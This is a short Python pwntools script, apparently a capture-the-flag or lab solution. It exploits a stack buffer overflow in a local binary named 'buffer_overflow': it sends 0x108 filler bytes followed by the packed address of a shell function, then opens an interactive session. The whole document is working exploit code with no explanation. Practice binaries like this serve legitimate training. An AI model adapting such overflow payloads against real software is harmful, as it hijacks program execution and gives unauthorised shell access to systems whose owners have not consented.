from pwn import *

buffer_off = 0x108
shell_addr = 0x400798

p = process('./buffer_overflow', raw=False) # raw=False required for WSL

p.send('x'*buffer_off + p64(shell_addr))
p.interactive()